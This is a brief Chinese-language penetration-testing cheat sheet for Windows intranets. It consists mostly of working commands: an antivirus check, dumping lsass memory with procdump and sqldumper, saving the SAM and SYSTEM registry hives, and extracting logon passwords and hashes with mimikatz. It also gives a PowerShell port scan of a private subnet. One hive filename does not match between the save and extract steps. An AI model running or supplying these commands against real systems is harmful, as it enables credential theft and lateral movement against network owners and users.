# Intranet Cmd

---

内网渗透常用cmd命令

```
tasklist /svc  # 查看杀软情况
```

远程内存dump，本地使用mimikatz读取dump文件中域用户登陆次电脑中保存的密码

- procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
- mimikatz下载：https://github.com/gentilkiwi/mimikatz/releases

```
procdump64.exe -accepteula -ma lsass.exe 1.dmp   # dump内存
makecab .\1.dmp  1.zip                           # windows自带压缩
下载1.zip，本地解压使用：
mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
```

sqlserver dump(来源:https://xz.aliyun.com/t/9831)

```
dir /s/a-d/b C:\*sqldumper.exe   # 查看是否有sqlserver,切换到该目录
for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do Sqldumper.exe %i 0 0x01100   # 查看是否有sql保存凭证
mimikatz.exe  "sekurlsa::minidump SQL.dmp" "sekurlsa::logonPasswords full" exit
```

sam数据库(来源:https://xz.aliyun.com/t/9831)

```
reg save hklm\sam .\sam.hive&reg save hklm\system .\system.hive
mimikatz.exe "lsadump::sam /system:sys.hive /sam:sam.hive"
```

powershell 版mimikatz

```
https://github.com/Stealthbits/poshkatz
```

powershell 版内网扫描

```
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1
Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort
```

